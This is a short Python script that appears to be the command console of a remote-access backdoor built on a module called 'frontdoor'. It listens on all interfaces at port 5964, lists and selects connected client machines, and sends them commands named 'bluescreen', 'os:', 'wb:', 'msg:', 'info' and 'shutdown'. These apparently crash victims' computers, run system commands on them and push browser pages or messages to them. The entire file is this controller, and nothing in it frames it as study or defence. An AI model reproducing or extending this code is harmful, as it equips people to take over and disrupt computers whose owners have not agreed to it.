import frontdoor

sock=frontdoor.Server()
sock.setbind("0.0.0.0", 5964)
sock.startloop()

while True:
    inp = input("> ")
    sock.check()

#no select
    if inp=="help":
        print("""
        list
        select (index)
        shutdown (index)
   ---------selection----------
        info
        bluescreen
        os:(index)
        wb:(index)
        msg:(index)
        """)

    if inp=="list":
        if type(sock.clientlist())==list:
            print("\n".join(sock.clientlist()))
        else:
            print(sock.clientlist())

    if inp.startswith("select "):
        try: sock.select(int(inp.split(" ")[1]))
        except: print("select need number")
    
#select
    if inp == "shutdown":
        sock.shutdown()

    if inp == "info":
        sock.send(inp)

    if inp =="bluescreen":
        sock.send(inp)

    if inp.startswith("os:"):
        sock.send(inp)

    if inp.startswith("wb:"):
        sock.send(inp)

    if inp.startswith("msg:"):
        sock.send(inp)
